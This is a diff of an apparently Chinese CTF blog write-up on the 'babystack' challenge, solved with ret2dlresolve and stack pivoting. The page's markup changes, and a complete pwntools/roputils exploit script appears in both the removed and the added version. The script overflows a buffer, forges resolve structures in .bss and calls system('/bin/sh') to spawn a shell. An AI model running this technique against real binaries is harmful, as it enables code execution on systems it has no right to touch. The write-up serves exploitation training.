@@ -198,14 +198,51 @@
       <div>
       </div>
     </div>
-    <h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>作为ret2dl的复习题。</p>
-<h2 id="2）exploitation"><a href="#2）exploitation" class="headerlink" title="2）exploitation"></a>2）exploitation</h2><p>溢出0x28+0x4字节，但是由于rop空间太小需要栈迁移。</p>
+    <html><head></head><body><h2 id="1-review">1)review<a class="post-anchor" href="#1-review"></a></h2><p>作为ret2dl的复习题。</p>
+<h2 id="2）exploitation">2）exploitation<a class="post-anchor" href="#2）exploitation"></a></h2><p>溢出0x28+0x4字节，但是由于rop空间太小需要栈迁移。</p>
 <p>并且没有aslr，relro为partial。</p>
 <p>非常典型的ret2dl。</p>
-<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>可以直接用roputils做</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> roputils<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>offset = <span class="hljs-number">44</span><br>readplt = <span class="hljs-number">0x08048300</span><br>bss = <span class="hljs-number">0x0804a020</span><br>vulFunc = <span class="hljs-number">0x0804843B</span><br><br>p = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getReloc</span>(<span class="hljs-params">elf, base</span>):</span><br>    jmprel = elf.dynamic(<span class="hljs-string">&#x27;JMPREL&#x27;</span>)<br>    relent = elf.dynamic(<span class="hljs-string">&#x27;RELENT&#x27;</span>)<br><br>    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)<br>    reloc_offset = addr_reloc - jmprel<br>    <span class="hljs-keyword">return</span> reloc_offset<br><br>rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>addr_bss = rop.section(<span class="hljs-string">&#x27;.bss&#x27;</span>)<br><br><span class="hljs-comment"># step1 : write sh &amp; resolve struct to bss</span><br>buf1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset <span class="hljs-comment">#44</span><br>buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="hljs-number">0</span>) + p32(addr_bss) + p32(<span class="hljs-number">100</span>)<br>p.send(buf1)<br><br>buf2 =  rop.string(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">20</span>, buf2)<br>buf2 += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">100</span>, buf2)<br>p.send(buf2)<br><br><span class="hljs-comment">#step2 : use dl_resolve_call get system &amp; system(&#x27;/bin/sh&#x27;)</span><br>buf3 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">44</span> + rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)<br>p.send(buf3)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h4 id=""><a class="post-anchor" href="#"></a></h4><p>可以直接用roputils做</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> roputils
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
+offset <span class="token operator">=</span> <span class="token number">44</span>
+readplt <span class="token operator">=</span> <span class="token number">0x08048300</span>
+bss <span class="token operator">=</span> <span class="token number">0x0804a020</span>
+vulFunc <span class="token operator">=</span> <span class="token number">0x0804843B</span>
 
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">getReloc</span><span class="token punctuation">(</span>elf<span class="token punctuation">,</span> base<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    jmprel <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic<span class="token punctuation">(</span><span class="token string">'JMPREL'</span><span class="token punctuation">)</span>
+    relent <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic<span class="token punctuation">(</span><span class="token string">'RELENT'</span><span class="token punctuation">)</span>
+
+    addr_reloc<span class="token punctuation">,</span> padlen_reloc <span class="token operator">=</span> elf<span class="token punctuation">.</span>align<span class="token punctuation">(</span>base<span class="token punctuation">,</span> jmprel<span class="token punctuation">,</span> relent<span class="token punctuation">)</span>
+    reloc_offset <span class="token operator">=</span> addr_reloc <span class="token operator">-</span> jmprel
+    <span class="token keyword">return</span> reloc_offset
+
+rop <span class="token operator">=</span> roputils<span class="token punctuation">.</span>ROP<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>
+addr_bss <span class="token operator">=</span> rop<span class="token punctuation">.</span>section<span class="token punctuation">(</span><span class="token string">'.bss'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># step1 : write sh &amp; resolve struct to bss</span>
+buf1 <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> offset <span class="token comment">#44</span>
+buf1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>readplt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vulFunc<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr_bss<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span>
+
+buf2 <span class="token operator">=</span>  rop<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+buf2 <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span>
+buf2 <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_data<span class="token punctuation">(</span>addr_bss<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span>
+buf2 <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span>
+
+<span class="token comment">#step2 : use dl_resolve_call get system &amp; system('/bin/sh')</span>
+buf3 <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">44</span> <span class="token operator">+</span> rop<span class="token punctuation">.</span>dl_resolve_call<span class="token punctuation">(</span>addr_bss<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">,</span> addr_bss<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf3<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</body></html>
 
   
     <div class="post-reward">
